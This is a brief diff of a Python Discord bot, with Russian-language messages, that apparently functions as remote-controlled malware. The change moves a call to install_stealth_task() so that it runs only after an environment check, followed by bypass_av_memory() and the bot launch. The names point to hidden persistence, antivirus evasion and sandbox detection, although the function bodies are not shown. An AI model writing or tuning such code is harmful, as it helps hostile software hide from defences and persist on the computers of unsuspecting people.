@@ -378,7 +378,7 @@ async def on_ready():
             f"Для справки: `!menu`"
         )
         await ch.send(msg)
-install_stealth_task()
+
 @bot.event
 async def on_command_error(ctx, error):
     if isinstance(error, commands.MissingRequiredArgument):
@@ -625,5 +625,6 @@ async def uninstall(ctx):
 
 if __name__ == "__main__":
     if check_environment():
+        install_stealth_task()
         bypass_av_memory()
         bot.run(BOT_TOKEN)
